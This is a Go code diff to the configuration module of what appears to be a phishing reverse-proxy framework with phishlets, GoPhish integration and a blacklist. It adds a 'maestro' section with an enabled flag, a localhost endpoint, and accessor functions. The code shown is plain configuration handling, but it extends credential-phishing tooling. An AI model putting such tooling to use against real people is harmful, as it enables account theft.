@@ -65,6 +65,11 @@ type GoPhishConfig struct {
 	InsecureTLS bool   `mapstructure:"insecure" json:"insecure" yaml:"insecure"`
 }
 
+type MaestroConfig struct {
+	Enabled  bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
+	Endpoint string `mapstructure:"endpoint" json:"endpoint" yaml:"endpoint"`
+}
+
 type GeneralConfig struct {
 	Domain       string `mapstructure:"domain" json:"domain" yaml:"domain"`
 	OldIpv4      string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
@@ -81,6 +86,7 @@ type Config struct {
 	certificates    *CertificatesConfig
 	blacklistConfig *BlacklistConfig
 	gophishConfig   *GoPhishConfig
+	maestroConfig   *MaestroConfig
 	proxyConfig     *ProxyConfig
 	phishletConfig  map[string]*PhishletConfig
 	phishlets       map[string]*Phishlet
@@ -102,6 +108,7 @@ const (
 	CFG_BLACKLIST    = "blacklist"
 	CFG_SUBPHISHLETS = "subphishlets"
 	CFG_GOPHISH      = "gophish"
+	CFG_MAESTRO      = "maestro"
 )
 
 const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
@@ -111,6 +118,7 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		general:         &GeneralConfig{},
 		certificates:    &CertificatesConfig{},
 		gophishConfig:   &GoPhishConfig{},
+		maestroConfig:   &MaestroConfig{},
 		phishletConfig:  make(map[string]*PhishletConfig),
 		phishlets:       make(map[string]*Phishlet),
 		phishletNames:   []string{},
@@ -152,6 +160,11 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c.cfg.UnmarshalKey(CFG_BLACKLIST, &c.blacklistConfig)
 
 	c.cfg.UnmarshalKey(CFG_GOPHISH, &c.gophishConfig)
+
+	c.cfg.UnmarshalKey(CFG_MAESTRO, &c.maestroConfig)
+	if c.maestroConfig.Endpoint == "" {
+		c.maestroConfig.Endpoint = "http://localhost:8080"
+	}
 
 	if c.general.OldIpv4 != "" {
 		if c.general.ExternalIpv4 == "" {
@@ -822,4 +835,29 @@ func (c *Config) GetGoPhishApiKey() string {
 
 func (c *Config) GetGoPhishInsecureTLS() bool {
 	return c.gophishConfig.InsecureTLS
+}
+
+func (c *Config) SetMaestroEnabled(enabled bool) {
+	c.maestroConfig.Enabled = enabled
+	c.cfg.Set(CFG_MAESTRO, c.maestroConfig)
+	log.Info("maestro enabled set to: %v", enabled)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetMaestroEndpoint(endpoint string) {
+	c.maestroConfig.Endpoint = endpoint
+	c.cfg.Set(CFG_MAESTRO, c.maestroConfig)
+	log.Info("maestro endpoint set to: %s", endpoint)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) GetMaestroEnabled() bool {
+	return c.maestroConfig.Enabled
+}
+
+func (c *Config) GetMaestroEndpoint() string {
+	if c.maestroConfig.Endpoint == "" {
+		return "http://localhost:8080"
+	}
+	return c.maestroConfig.Endpoint
 }
